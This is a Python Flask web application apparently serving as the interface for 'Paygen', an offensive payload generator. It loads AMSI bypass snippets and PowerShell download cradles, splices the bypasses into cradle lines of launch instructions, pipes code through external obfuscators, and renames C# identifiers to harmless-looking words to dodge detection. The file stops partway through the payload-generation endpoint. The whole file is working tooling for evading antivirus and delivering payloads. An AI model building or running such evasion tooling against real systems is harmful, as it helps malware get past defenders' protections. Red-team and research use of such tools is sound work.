"""
Flask Web Application for Paygen

Provides a web-based interface for payload generation and management.
"""

import os
import sys
import json
import threading
import uuid
import re
import tempfile
import subprocess
import random
from pathlib import Path
from typing import Dict, Any, Optional, Tuple
from datetime import datetime

from flask import Flask, render_template, jsonify, request, send_from_directory
from flask_cors import CORS

# Import core paygen modules
sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from src.core.config import get_config
from src.core.recipe_loader import RecipeLoader
from src.core.payload_builder import PayloadBuilder, BuildStep
from src.core.history import HistoryManager
from src.core.validator import ParameterValidator, ValidationError


# Global state
app = Flask(__name__, 
            static_folder='static',
            template_folder='templates')
CORS(app)

# Store active build sessions
build_sessions: Dict[str, Dict[str, Any]] = {}
build_locks: Dict[str, threading.Lock] = {}

# Configuration and data
config = None
recipe_loader = None
recipes = []
history_manager = None
ps_obfuscation_methods = []
ps_features = []


def load_amsi_bypasses():
    """Load AMSI bypass methods from ps-features.yaml
    
    Returns:
        Dict mapping bypass names to their code content
    """
    bypasses = {}
    
    try:
        ps_features_path = config.ps_features_yaml
        if not ps_features_path.exists():
            print(f"Warning: ps-features.yaml not found at {ps_features_path}", file=sys.stderr)
            return bypasses
        
        import yaml
        with open(ps_features_path, 'r') as f:
            features = yaml.safe_load(f) or []
        
        # Filter for AMSI bypasses
        for feature in features:
            if feature.get('type') == 'amsi' and 'code' in feature:
                name = feature.get('name', 'Unknown')
                bypasses[name] = feature.get('code', '').strip()
    except Exception as e:
        print(f"Warning: Failed to load AMSI bypasses from ps-features.yaml: {e}", file=sys.stderr)
    
    return bypasses


def inject_amsi_bypass_launch_instructions(launch_instructions: str, bypass_method: str, obf_method: str = '') -> str:
    """Inject AMSI bypass into launch instructions
    
    Args:
        launch_instructions: Markdown text containing PowerShell code blocks
        bypass_method: Name of the bypass method to use
        obf_method: Optional name of obfuscation method to apply
        
    Returns:
        Modified launch instructions with AMSI bypass injected
    """
    if not launch_instructions:
        return launch_instructions
    
    # Load bypass code from ps-features
    bypass_feature = None
    for feature in ps_features:
        if feature.get('name') == bypass_method and feature.get('type') == 'amsi':
            bypass_feature = feature
            break
    
    if not bypass_feature or 'code' not in bypass_feature:
        return launch_instructions
    
    try:
        bypass_code = bypass_feature.get('code', '').strip()
        
        # Apply obfuscation to bypass code if requested and allowed
        if obf_method and not bypass_feature.get('no-obf', False):
            obf_method_data = None
            for method in ps_obfuscation_methods:
                if method.get('name') == obf_method:
                    obf_method_data = method
                    break
            
            if obf_method_data:
                # Apply obfuscation
                with tempfile.NamedTemporaryFile(mode='w', suffix='.ps1', delete=False) as tmp_in:
                    tmp_in.write(bypass_code)
                    tmp_in_path = tmp_in.name
                
                tmp_out_path = tmp_in_path.replace('.ps1', '_obf.ps1')
                
                try:
                    # Generate random values
                    rand_hex_bytes = random.randint(8, 32)
                    rand_hex_length = rand_hex_bytes * 2
                    rand_hex = ''.join(random.choices('0123456789abcdef', k=rand_hex_length))
                    rand_stringdict = random.randint(0, 100)
                    rand_deadcode = random.randint(0, 100)
                    rand_seed = random.randint(0, 10000)
                    
                    command = obf_method_data.get('command', '').format(
                        temp=tmp_in_path,
                        out=tmp_out_path,
                        hex_key=rand_hex,
                        string_dict=rand_stringdict,
                        dead_code=rand_deadcode,
                        seed=rand_seed
                    )
                    
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=120
                    )
                    
                    if result.returncode == 0 and os.path.exists(tmp_out_path):
                        with open(tmp_out_path, 'r') as f:
                            bypass_code = f.read().strip()
                    
                    # Clean up
                    try:
                        os.unlink(tmp_in_path)
                        if os.path.exists(tmp_out_path):
                            os.unlink(tmp_out_path)
                    except:
                        pass
                except Exception:
                    # Clean up on error
                    try:
                        os.unlink(tmp_in_path)
                        if os.path.exists(tmp_out_path):
                            os.unlink(tmp_out_path)
                    except:
                        pass
    except Exception:
        return launch_instructions
    
    # Check if bypass is a one-liner (no newlines)
    is_oneliner = '\n' not in bypass_code
    
    # Add AMSI Bypass section at the top
    amsi_section = f"# AMSI Bypass\n\n```powershell\n{bypass_code}\n```\n\n"
    modified_instructions = amsi_section + launch_instructions
    
    # If one-liner, prepend to download cradles
    if is_oneliner:
        # Keywords that identify download cradles
        cradle_keywords = [
            'DownloadString',
            'DownloadFile',
            'DownloadData',
            'WebClient',
            'WebRequest',
            'Invoke-WebRequest',
            'IWR',
            'Invoke-RestMethod',
            'IRM',
            'Net.WebClient'
        ]
        
        # Pattern to match PowerShell code blocks
        pattern = r'(```(?:powershell|ps1)\s*\n)(.*?)(```)'
        
        def process_code_block(match):
            opening = match.group(1)
            code = match.group(2)
            closing = match.group(3)
            
            # Check if this block contains download cradle keywords
            has_cradle = any(keyword in code for keyword in cradle_keywords)
            
            if not has_cradle:
                return match.group(0)
            
            # Split code into lines
            lines = code.split('\n')
            modified_lines = []
            block_modified = False
            
            for line in lines:
                # Check if this line contains a cradle
                if any(keyword in line for keyword in cradle_keywords):
                    # Prepend bypass with semicolon separator
                    modified_line = f"{bypass_code}; {line}"
                    modified_lines.append(modified_line)
                    block_modified = True
                else:
                    modified_lines.append(line)
            
            if block_modified:
                # Add note after the code block
                modified_code = '\n'.join(modified_lines)
                return f"{opening}{modified_code}\n{closing}\n\n*The command above includes an AMSI bypass*"
            else:
                return match.group(0)
        
        # Apply to all PowerShell code blocks
        modified_instructions = re.sub(pattern, process_code_block, modified_instructions, flags=re.DOTALL)
    
    return modified_instructions


def obfuscate_powershell_in_launch_instructions(launch_instructions: str, method_name: str) -> tuple:
    """Obfuscate PowerShell code blocks in launch instructions
    
    Args:
        launch_instructions: Markdown text containing PowerShell code blocks
        method_name: Name of obfuscation method from ps-obfuscation.yaml
        
    Returns:
        Tuple of (modified_instructions, commands_executed)
    """
    if not launch_instructions:
        return launch_instructions, []
    
    # Find the obfuscation method
    obf_method = None
    for method in ps_obfuscation_methods:
        if method.get('name') == method_name:
            obf_method = method
            break
    
    if not obf_method:
        return launch_instructions, []
    
    command_template = obf_method.get('command', '')
    if not command_template:
        return launch_instructions, []
    
    # Pattern to match PowerShell code blocks (```powershell or ```ps1)
    pattern = r'```(?:powershell|ps1)\s*\n(.*?)```'
    
    commands_executed = []
    
    def obfuscate_code_block(match):
        code = match.group(1)
        
        # Create temporary files for obfuscation
        with tempfile.NamedTemporaryFile(mode='w', suffix='.ps1', delete=False) as tmp_in:
            tmp_in.write(code)
            tmp_in_path = tmp_in.name
        
        tmp_out_path = tmp_in_path.replace('.ps1', '_obf.ps1')
        
        try:
            # Generate random values
            rand_hex_bytes = random.randint(8, 32)
            rand_hex_length = rand_hex_bytes * 2
            rand_hex = ''.join(random.choices('0123456789abcdef', k=rand_hex_length))
            rand_stringdict = random.randint(0, 100)
            rand_deadcode = random.randint(0, 100)
            rand_seed = random.randint(0, 10000)
            
            # Format command
            command = command_template.format(
                temp=tmp_in_path,
                out=tmp_out_path,
                hex_key=rand_hex,
                string_dict=rand_stringdict,
                dead_code=rand_deadcode,
                seed=rand_seed
            )
            
            # Execute obfuscation
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=120
            )
            
            # Check if successful
            if result.returncode == 0 and os.path.exists(tmp_out_path):
                with open(tmp_out_path, 'r') as f:
                    obfuscated_code = f.read()
                
                # Ensure code ends with newline before closing backticks
                if not obfuscated_code.endswith('\n'):
                    obfuscated_code += '\n'
                
                # Clean up temp files
                try:
                    os.unlink(tmp_in_path)
                    os.unlink(tmp_out_path)
                except:
                    pass
                
                # Store the successful command
                commands_executed.append(command)
                
                return f'```powershell\n{obfuscated_code}```'
            
            # Failed, return original
            try:
                os.unlink(tmp_in_path)
                if os.path.exists(tmp_out_path):
                    os.unlink(tmp_out_path)
            except:
                pass
            
            return match.group(0)  # Return original code block
            
        except Exception as e:
            # Clean up and return original on error
            try:
                os.unlink(tmp_in_path)
                if os.path.exists(tmp_out_path):
                    os.unlink(tmp_out_path)
            except:
                pass
            
            return match.group(0)
    
    # Replace all PowerShell code blocks
    modified_instructions = re.sub(pattern, obfuscate_code_block, launch_instructions, flags=re.DOTALL)
    return modified_instructions, commands_executed


def generate_cradle(cradle_name: str, lhost: str, lport: int, output_file: str, obf_method: str = '') -> Tuple[str, str]:
    """Generate a download cradle from ps-features.yaml
    
    Args:
        cradle_name: Name of cradle from ps-features.yaml
        lhost: Listening host (IP or domain)
        lport: Listening port
        output_file: Output filename for the payload
        obf_method: Optional obfuscation method to apply
        
    Returns:
        Tuple of (cradle_code, command_used)
    """
    # Find the cradle
    cradle_feature = None
    for feature in ps_features:
        if feature.get('name') == cradle_name and feature.get('type', '').startswith('cradle-'):
            cradle_feature = feature
            break
    
    if not cradle_feature or 'code' not in cradle_feature:
        return '', ''
    
    # Build base URL based on port (without output_file)
    if lport == 443:
        url = f'https://{lhost}'
    elif lport == 80:
        url = f'http://{lhost}'
    else:
        url = f'http://{lhost}:{lport}'
    
    # Generate cradle code
    cradle_code = cradle_feature.get('code', '').strip()
    cradle_code = cradle_code.replace('{url}', url)
    cradle_code = cradle_code.replace('{output_file}', output_file)
    
    command_used = ''
    
    # Apply obfuscation if requested and allowed
    if obf_method and not cradle_feature.get('no-obf', False):
        obf_method_data = None
        for method in ps_obfuscation_methods:
            if method.get('name') == obf_method:
                obf_method_data = method
                break
        
        if obf_method_data:
            # Apply obfuscation
            with tempfile.NamedTemporaryFile(mode='w', suffix='.ps1', delete=False) as tmp_in:
                tmp_in.write(cradle_code)
                tmp_in_path = tmp_in.name
            
            tmp_out_path = tmp_in_path.replace('.ps1', '_obf.ps1')
            
            try:
                # Generate random values
                rand_hex_bytes = random.randint(8, 32)
                rand_hex_length = rand_hex_bytes * 2
                rand_hex = ''.join(random.choices('0123456789abcdef', k=rand_hex_length))
                rand_stringdict = random.randint(0, 100)
                rand_deadcode = random.randint(0, 100)
                rand_seed = random.randint(0, 10000)
                
                command = obf_method_data.get('command', '').format(
                    temp=tmp_in_path,
                    out=tmp_out_path,
                    hex_key=rand_hex,
                    string_dict=rand_stringdict,
                    dead_code=rand_deadcode,
                    seed=rand_seed
                )
                
                command_used = command
                
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=120
                )
                
                if result.returncode == 0 and os.path.exists(tmp_out_path):
                    with open(tmp_out_path, 'r') as f:
                        cradle_code = f.read().strip()
                
                # Clean up
                try:
                    os.unlink(tmp_in_path)
                    if os.path.exists(tmp_out_path):
                        os.unlink(tmp_out_path)
                except:
                    pass
            except Exception:
                # Clean up on error
                try:
                    os.unlink(tmp_in_path)
                    if os.path.exists(tmp_out_path):
                        os.unlink(tmp_out_path)
                except:
                    pass
    
    return cradle_code, command_used


def obfuscate_csharp_identifiers(code: str) -> tuple:
    """Obfuscate C# function and variable names
    
    Args:
        code: C# source code
        
    Returns:
        Tuple of (obfuscated_code, replacement_map)
    """
    import random
    
    # Large list of innocuous replacement names (150+)
    replacement_pool = [
        # Nature - landscapes
        'forest', 'lake', 'river', 'mountain', 'ocean', 'desert', 'valley', 'canyon',
        'meadow', 'stream', 'pond', 'hill', 'cliff', 'cave', 'island', 'shore',
        'beach', 'dune', 'glacier', 'volcano', 'prairie', 'marsh', 'swamp', 'bayou',
        'fjord', 'plateau', 'ridge', 'peak', 'summit', 'basin', 'delta', 'estuary',
        # Sky and space
        'star', 'moon', 'sun', 'planet', 'comet', 'nebula', 'galaxy', 'cosmos',
        'orbit', 'asteroid', 'meteor', 'aurora', 'eclipse', 'horizon', 'zenith', 'constellation',
        # Weather
        'cloud', 'rain', 'snow', 'wind', 'storm', 'thunder', 'lightning', 'fog',
        'mist', 'hail', 'frost', 'breeze', 'gale', 'drizzle', 'blizzard', 'cyclone',
        # Plants
        'tree', 'flower', 'grass', 'leaf', 'branch', 'root', 'seed', 'bloom',
        'pine', 'oak', 'willow', 'birch', 'maple', 'cedar', 'fern', 'moss',
        'ivy', 'vine', 'bush', 'shrub', 'herb', 'petal', 'thorn', 'bamboo',
        # Animals
        'bird', 'fish', 'deer', 'wolf', 'bear', 'eagle', 'hawk', 'owl',
        'fox', 'rabbit', 'squirrel', 'beaver', 'otter', 'seal', 'whale', 'dolphin',
        'tiger', 'lion', 'leopard', 'panther', 'lynx', 'falcon', 'raven', 'crow',
        # Objects - furniture
        'table', 'chair', 'desk', 'lamp', 'window', 'door', 'wall', 'floor',
        'shelf', 'cabinet', 'drawer', 'mirror', 'frame', 'cushion', 'bench', 'couch',
        # Objects - office
        'book', 'paper', 'pen', 'pencil', 'notebook', 'folder', 'file', 'document',
        'binder', 'envelope', 'stamp', 'clip', 'stapler', 'marker', 'eraser', 'ruler',
        # Gems and minerals
        'ruby', 'emerald', 'sapphire', 'diamond', 'pearl', 'jade', 'amber', 'topaz',
        'quartz', 'opal', 'garnet', 'onyx', 'crystal', 'granite', 'marble', 'slate',
        # Greek letters
        'alpha', 'beta', 'gamma', 'delta', 'epsilon', 'zeta', 'theta', 'omega',
        'sigma', 'lambda', 'kappa', 'phi', 'psi', 'rho', 'tau', 'iota',
        # Common nouns
        'config', 'data', 'info', 'result', 'item', 'element', 'node', 'key',
        'handle', 'buffer', 'cache', 'queue', 'stack', 'array', 'map', 'field',
        'value', 'index', 'count', 'size', 'length', 'width', 'height', 'depth',
        'state', 'status', 'flag', 'mode', 'type', 'kind', 'form', 'shape'
    ]
    
    # Shuffle to randomize order
    random.shuffle(replacement_pool)
    
    # Track replacements - maps original identifier to replacement name
    replacements = {}
    used_replacements = set()
    pool_index = 0
    
    def get_replacement_name(original_identifier):
        """Get a unique replacement name for an identifier"""
        nonlocal pool_index, replacements, used_replacements
        
        # If we already have a replacement for this identifier, reuse it
        if original_identifier in replacements:
            return replacements[original_identifier]
        
        # Get next unused name from pool
        while pool_index < len(replacement_pool):
            name = replacement_pool[pool_index]
            pool_index += 1
            if name not in used_replacements:
                used_replacements.add(name)
                replacements[original_identifier] = name
                return name
        
        # If we run out of pool, generate numbered names
        counter = 1
        while True:
            name = f"var{counter}"
            if name not in used_replacements:
                used_replacements.add(name)
                replacements[original_identifier] = name
                return name
            counter += 1
    
    # C# keywords, framework types, and attributes to NEVER replace
    protected_keywords = {
        # Keywords
        'using', 'namespace', 'class', 'struct', 'enum', 'interface', 'delegate',
        'public', 'private', 'protected', 'internal', 'static', 'readonly', 'const',
        'virtual', 'override', 'abstract', 'sealed', 'new', 'extern', 'unsafe',
        'void', 'int', 'uint', 'long', 'ulong', 'short', 'ushort', 'byte', 'sbyte',
        'float', 'double', 'decimal', 'bool', 'char', 'string', 'object',
        'var', 'dynamic', 'if', 'else', 'switch', 'case', 'default',
        'for', 'foreach', 'while', 'do', 'break', 'continue', 'return',
        'throw', 'try', 'catch', 'finally', 'lock', 'async', 'await', 'yield',
        'get', 'set', 'value', 'add', 'remove', 'true', 'false', 'null',
        'this', 'base', 'typeof', 'sizeof', 'is', 'as', 'in', 'out', 'ref', 'params',
        'checked', 'unchecked', 'fixed', 'stackalloc', 'nameof', 'when', 'where',
        
        # Common .NET types
        'System', 'Console', 'String', 'Int16', 'Int32', 'Int64', 'UInt16', 'UInt32', 'UInt64',
        'Boolean', 'Byte', 'SByte', 'Char', 'Double', 'Single', 'Decimal', 'IntPtr', 'UIntPtr',
        'Object', 'Exception', 'Array', 'Delegate', 'MulticastDelegate', 'Enum', 'ValueType',
        'DateTime', 'TimeSpan', 'Guid', 'Math', 'Convert', 'BitConverter', 'Buffer',
        
        # Runtime/Interop
        'Marshal', 'GCHandle', 'GCHandleType', 'Runtime', 'InteropServices', 'Interop',
        'DllImport', 'StructLayout', 'FieldOffset', 'MarshalAs', 'UnmanagedType',
        'LayoutKind', 'CharSet', 'CallingConvention', 'ComVisible', 'Guid',
        
        # Attribute properties
        'SetLastError', 'EntryPoint', 'CharSet', 'CallingConvention', 'PreserveSig',
        'ExactSpelling', 'BestFitMapping', 'ThrowOnUnmappableChar',
        
        # CharSet values
        'Auto', 'Ansi', 'Unicode', 'None',
        
        # LayoutKind values
        'Sequential', 'Explicit',
        
        # UnmanagedType values
        'Bool', 'I1', 'U1', 'I2', 'U2', 'I4', 'U4', 'I8', 'U8', 'R4', 'R8',
        'LPStr', 'LPWStr', 'LPTStr', 'ByValTStr', 'BStr', 'SysInt', 'SysUInt',
        
        # Modifiers
        'In', 'Out', 'Optional', 'Obsolete', 'Serializable', 'NonSerialized',
        
        # Common method names from framework
        'ToString', 'GetHashCode', 'Equals', 'GetType', 'Dispose', 'Finalize',
        'WriteLine', 'Write', 'ReadLine', 'Read',
        
        # Common collections
        'List', 'Dictionary', 'HashSet', 'Queue', 'Stack', 'ArrayList', 'Hashtable',
        'IEnumerable', 'ICollection', 'IList', 'IDictionary',
        
        # Threading types (but not parameter names)
        'Task', 'ThreadPool', 'Monitor', 'Mutex', 'Semaphore',
        
        # Common struct fields
        'Length', 'Count', 'Capacity', 'Size', 'Width', 'Height', 'X', 'Y', 'Z',
    }
    
    # Pattern to find user-defined identifiers
    # Match: namespace names, class names, method names, variable names, parameter names
    patterns_to_replace = [
        # Namespace declarations: namespace MyNamespace
        (r'\bnamespace\s+([A-Z][a-zA-Z0-9_]*)\b', 1),
        # Class declarations: class MyClass
        (r'\bclass\s+([A-Z][a-zA-Z0-9_]*)\b', 1),
        # Struct declarations: struct MyStruct  
        (r'\bstruct\s+([A-Z][a-zA-Z0-9_]*)\b', 1),
        # Enum declarations: enum MyEnum
        (r'\benum\s+([A-Z][a-zA-Z0-9_]*)\b', 1),
        # Method declarations: static void MyMethod( or bool MyMethod(
        (r'\b(?:static\s+)?(?:extern\s+)?(?:void|bool|int|uint|long|ulong|short|ushort|byte|sbyte|string|String|IntPtr|double|float)\s+([a-z][a-zA-Z0-9_]*)\s*\(', 1),
        # Variable declarations: int myVar = or String myVar; or byte[] myArray = (including array types)
        (r'\b(?:int|uint|long|ulong|short|ushort|byte|sbyte|bool|float|double|decimal|char|string|String|IntPtr|var)\s*(?:\[\])?\s*([a-zA-Z_][a-zA-Z0-9_]*)\b(?=\s*[=;,])', 1),
        # Public static constants: public static uint MY_CONSTANT = (including array types)
        (r'\bpublic\s+static\s+(?:int|uint|long|ulong|short|ushort|byte|sbyte|bool|float|double|decimal|char|string|String|IntPtr)\s*(?:\[\])?\s*([a-zA-Z_][a-zA-Z0-9_]*)\s*=', 1),
        # All parameters in method signatures (any type followed by identifier)
        # This will catch: IntPtr Thread, IntPtr Token, uint dwAccess, string[] args, etc.
        (r'\b(?:int|uint|long|ulong|short|ushort|byte|sbyte|bool|float|double|decimal|char|string|IntPtr|out|ref|in)\s*(?:\[\])?\s*(?:out\s+|ref\s+|in\s+)?([a-zA-Z_][a-zA-Z0-9_]*)\b(?=\s*[,\)])', 1),
        # Field declarations in structs/classes: public int myField; or public IntPtr hField;
        # Enhanced to catch all field patterns including dw*, w*, cb*, h*, lp*, n*
        # Also handles fields with attributes like [MarshalAs(...)]
        (r'\b(?:public|private|protected|internal)\s+(?:static\s+)?(?:readonly\s+)?(?:int|uint|long|ulong|short|ushort|byte|sbyte|bool|float|double|decimal|char|string|String|IntPtr|UInt32|Int32)\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*;', 1),
        # Enum members and custom type parameters (e.g., SECURITY_IMPERSONATION_LEVEL ImpersonationLevel)
        (r'\b([A-Z][A-Z0-9_]+)\s+([a-zA-Z_][a-zA-Z0-9_]*)\b', 2),
        # ref/out struct parameters: ref STARTUPINFO lpStartupInfo
        (r'\b(?:ref|out|in)\s+([A-Z][A-Z0-9_]+)\s+([a-zA-Z_][a-zA-Z0-9_]*)\b', 2),
    ]
    
    # Find all identifiers to replace
    identifiers_to_replace = set()
    
    for pattern, group_idx in patterns_to_replace:
        matches = re.finditer(pattern, code)
        for match in matches:
            identifier = match.group(group_idx)
            if identifier not in protected_keywords:
                identifiers_to_replace.add(identifier)
    
    # Special handling for enum members - find all values inside enum blocks
    enum_blocks = re.finditer(r'\benum\s+[A-Z][a-zA-Z0-9_]*\s*\{([^}]+)\}', code, re.DOTALL)
    for enum_match in enum_blocks:
        enum_body = enum_match.group(1)
        # Find enum member names (identifiers before = or , or })
        # Matches: SecurityAnonymous, TokenPrimary = 1, etc.
        enum_members = re.findall(r'\b([A-Z][a-zA-Z0-9_]*)\s*(?:=\s*\d+)?(?:\s*,|\s*$)', enum_body, re.MULTILINE)
        for member in enum_members:
            if member not in protected_keywords:
                identifiers_to_replace.add(member)
    
    # Build replacement map
    for identifier in sorted(identifiers_to_replace):
        if identifier not in replacements:
            replacements[identifier] = get_replacement_name(identifier)
    
    # Step 1: Extract and protect string literals
    string_placeholders = {}
    placeholder_counter = 0
    
    def replace_string_with_placeholder(match):
        nonlocal placeholder_counter
        placeholder = f'__STRING_PLACEHOLDER_{placeholder_counter}__'
        string_placeholders[placeholder] = match.group(0)
        placeholder_counter += 1
        return placeholder
    
    # Match both regular strings and verbatim strings (@"...")
    # Also match char literals ('x')
    string_pattern = r'(@?"(?:[^"\\]|\\.)*"|\'(?:[^\'\\]|\\.)?\')'
    obfuscated_code = re.sub(string_pattern, replace_string_with_placeholder, code)
    
    # Step 2: Apply identifier replacements (now strings are protected)
    for original, replacement in replacements.items():
        # Use word boundary pattern to replace all occurrences
        pattern = r'\b' + re.escape(original) + r'\b'
        obfuscated_code = re.sub(pattern, replacement, obfuscated_code)
    
    # Step 3: Restore string literals
    for placeholder, original_string in string_placeholders.items():
        obfuscated_code = obfuscated_code.replace(placeholder, original_string)
    
    return obfuscated_code, replacements


def init_app():
    """Initialize the Flask application with paygen configuration"""
    global config, recipe_loader, recipes, history_manager, ps_obfuscation_methods, ps_features
    
    # Load configuration
    try:
        config = get_config()
        app.config['SECRET_KEY'] = 'paygen-web-secret-key-change-in-production'
        app.config['JSON_SORT_KEYS'] = False
    except Exception as e:
        print(f"✗ Failed to load configuration: {e}", file=sys.stderr)
        sys.exit(1)
    
    # Load recipes
    try:
        recipe_loader = RecipeLoader(config)
        recipes = recipe_loader.load_all_recipes()
        print(f"✓ Loaded {len(recipes)} recipes")
    except Exception as e:
        print(f"✗ Failed to load recipes: {e}", file=sys.stderr)
        sys.exit(1)
    
    # Initialize history manager
    try:
        history_file = config.config_path.parent / "history.json"
        history_manager = HistoryManager(history_file)
    except Exception as e:
        print(f"✗ Failed to initialize history: {e}", file=sys.stderr)
        history_manager = None
    
    # Load PowerShell obfuscation methods
    try:
        import yaml
        ps_obf_path = config.ps_obfuscation_yaml
        if ps_obf_path.exists():
            with open(ps_obf_path, 'r') as f:
                ps_obfuscation_methods = yaml.safe_load(f) or []
            print(f"✓ Loaded {len(ps_obfuscation_methods)} PS obfuscation methods")
        else:
            print(f"✗ ps-obfuscation.yaml not found at {ps_obf_path}", file=sys.stderr)
            ps_obfuscation_methods = []
    except Exception as e:
        print(f"✗ Failed to load ps-obfuscation.yaml: {e}", file=sys.stderr)
        ps_obfuscation_methods = []
    
    # Load PowerShell features (AMSI, cradles)
    try:
        import yaml
        ps_feat_path = config.ps_features_yaml
        if ps_feat_path.exists():
            with open(ps_feat_path, 'r') as f:
                ps_features = yaml.safe_load(f) or []
            print(f"✓ Loaded {len(ps_features)} PS features (AMSI/cradles)")
        else:
            print(f"✗ ps-features.yaml not found at {ps_feat_path}", file=sys.stderr)
            ps_features = []
    except Exception as e:
        print(f"✗ Failed to load ps-features.yaml: {e}", file=sys.stderr)
        ps_features = []


@app.route('/')
def index():
    """Main page"""
    return render_template('index.html', 
                          show_build_debug=config.show_build_debug if config else False)


@app.route('/api/amsi-bypasses')
def get_amsi_bypasses():
    """Get available AMSI bypass methods from ps-features.yaml"""
    amsi_methods = [f for f in ps_features if f.get('type') == 'amsi']
    
    # Return list with names and no-obf flags
    bypasses = []
    for method in amsi_methods:
        bypasses.append({
            'name': method.get('name', 'Unknown'),
            'no_obf': method.get('no-obf', False)
        })
    
    return jsonify({'bypasses': bypasses})


@app.route('/api/ps-obfuscation-methods')
def get_ps_obfuscation_methods():
    """Get available PowerShell obfuscation methods"""
    methods = [{'name': m.get('name')} for m in ps_obfuscation_methods]
    return jsonify({'methods': methods})


@app.route('/api/ps-cradles')
def get_ps_cradles():
    """Get available PowerShell cradles grouped by type"""
    cradles = {'ps1': [], 'exe': [], 'dll': []}
    
    for feature in ps_features:
        feature_type = feature.get('type', '')
        if feature_type == 'cradle-ps1':
            cradles['ps1'].append({
                'name': feature.get('name'),
                'no_obf': feature.get('no-obf', False)
            })
        elif feature_type == 'cradle-exe':
            cradles['exe'].append({
                'name': feature.get('name'),
                'no_obf': feature.get('no-obf', False)
            })
        elif feature_type == 'cradle-dll':
            cradles['dll'].append({
                'name': feature.get('name'),
                'no_obf': feature.get('no-obf', False)
            })
    
    return jsonify({'cradles': cradles})


@app.route('/api/recipes')
def get_recipes():
    """Get all recipes organized by category"""
    # Reload recipes from disk to detect changes
    current_recipes = recipe_loader.load_all_recipes()
    
    # Organize recipes by category
    categories = {}
    for recipe in current_recipes:
        category = recipe.category if recipe.category else "Misc"
        if category not in categories:
            categories[category] = []
        
        # Convert recipe to dict and add extra fields
        recipe_dict = {
            'name': recipe.name,
            'category': category,
            'description': recipe.description,
            'effectiveness': recipe.effectiveness,
            'mitre_tactic': recipe.mitre_tactic,
            'mitre_technique': recipe.mitre_technique,
            'artifacts': recipe.artifacts,
            'parameters': recipe.parameters,
            'preprocessing': recipe.preprocessing,
            'output': recipe.output,
            'launch_instructions': recipe.launch_instructions,
            'is_template_based': recipe.is_template_based,
            'is_command_based': recipe.is_command_based
        }
        categories[category].append(recipe_dict)
    
    return jsonify({
        'categories': categories,
        'total_recipes': len(current_recipes),
        'total_categories': len(categories)
    })


@app.route('/api/recipe/<category>/<name>')
def get_recipe(category, name):
    """Get a specific recipe by category and name"""
    # Reload recipes from disk to detect changes
    current_recipes = recipe_loader.load_all_recipes()
    
    for recipe in current_recipes:
        # Handle empty categories mapped to "Misc"
        recipe_category = recipe.category if recipe.category else "Misc"
        if recipe_category == category and recipe.name == name:
            # Resolve {config.*} placeholders in parameter defaults
            resolved_params = []
            for param in recipe.parameters:
                param_copy = param.copy()
                default = param_copy.get('default', '')
                if isinstance(default, str) and default.startswith('{config.'):
                    config_key = default[8:-1]  # Extract key from {config.key}
                    resolved_value = getattr(config, config_key, None)
                    if resolved_value is not None:
                        param_copy['default'] = str(resolved_value)
                    else:
                        # Keep original if attribute doesn't exist
                        print(f"Warning: Config attribute '{config_key}' not found", file=sys.stderr)
                resolved_params.append(param_copy)
            
            return jsonify({
                'name': recipe.name,
                'category': recipe.category,
                'description': recipe.description,
                'effectiveness': recipe.effectiveness,
                'mitre_tactic': recipe.mitre_tactic,
                'mitre_technique': recipe.mitre_technique,
                'artifacts': recipe.artifacts,
                'parameters': resolved_params,
                'preprocessing': recipe.preprocessing,
                'output': recipe.output,
                'launch_instructions': recipe.launch_instructions,
                'is_template_based': recipe.is_template_based,
                'is_command_based': recipe.is_command_based
            })
    
    return jsonify({'error': 'Recipe not found'}), 404


@app.route('/api/recipe/<category>/<name>/code')
def get_recipe_code(category, name):
    """Get the template/command code for a recipe"""
    # Reload recipes from disk to detect changes
    current_recipes = recipe_loader.load_all_recipes()
    
    for recipe in current_recipes:
        # Handle empty categories mapped to "Misc"
        recipe_category = recipe.category if recipe.category else "Misc"
        if recipe_category == category and recipe.name == name:
            output_type = recipe.output.get('type', '')
            
            if output_type == 'template' or recipe.is_template_based:
                # Load template file
                template_path = config.templates_dir / recipe.output.get('template', '')
                try:
                    with open(template_path, 'r') as f:
                        code = f.read()
                    
                    # Detect language from extension
                    ext = template_path.suffix.lower()
                    language_map = {
                        '.cs': 'csharp',
                        '.ps1': 'powershell',
                        '.py': 'python',
                        '.c': 'c',
                        '.cpp': 'cpp',
                        '.sh': 'bash',
                        '.js': 'javascript'
                    }
                    language = language_map.get(ext, 'text')
                    
                    return jsonify({
                        'type': 'template',
                        'code': code,
                        'language': language,
                        'path': str(template_path)
                    })
                except Exception as e:
                    return jsonify({'error': f'Failed to load template: {e}'}), 500
            
            elif output_type == 'command' or recipe.is_command_based:
                # Return command
                command = recipe.output.get('command', '')
                return jsonify({
                    'type': 'command',
                    'code': command,
                    'language': 'bash'
                })
            
            return jsonify({'error': 'Unknown output type'}), 400
    
    return jsonify({'error': 'Recipe not found'}), 404


@app.route('/api/validate-parameter', methods=['POST'])
def validate_parameter():
    """Validate a single parameter value"""
    data = request.json
    param_def = data.get('parameter')
    value = data.get('value')
    
    validator = ParameterValidator()
    try:
        validated = validator.validate_parameter(param_def, value)
        return jsonify({
            'valid': True,
            'value': validated
        })
    except ValidationError as e:
        return jsonify({
            'valid': False,
            'error': str(e)
        }), 400


@app.route('/api/generate', methods=['POST'])
def generate_payload():
    """Generate a payload from recipe and parameters"""
    data = request.json
    category = data.get('category')
    recipe_name = data.get('recipe')
    parameters = data.get('parameters', {})
    preprocessing_selections = data.get('preprocessing_selections', {})
    build_options = data.get('build_options', {})
    
    # Reload recipes from disk to ensure we have the latest version
    current_recipes = recipe_loader.load_all_recipes()
    
    # Find recipe
    recipe_obj = None
    for r in current_recipes:
        if r.category == category and r.name == recipe_name:
            recipe_obj = r
            break
    
    if not recipe_obj:
        return jsonify({'error': 'Recipe not found'}), 404
    
    # Build a set of selected option names for conditional parameter validation
    selected_option_names = set()
    preprocessing_options = [p for p in recipe_obj.preprocessing if p.get('type') == 'option']
    for option_step in preprocessing_options:
        option_name = option_step.get('name')
        selected_index = preprocessing_selections.get(option_name, 0)
        options = option_step.get('options', [])
        if 0 <= selected_index < len(options):
            selected_option = options[selected_index]
            selected_option_names.add(selected_option.get('name'))
    
    # Validate parameters
    validator = ParameterValidator()
    validated_params = {}
    
    try:
        for param_def in recipe_obj.parameters:
            param_name = param_def.get('name')
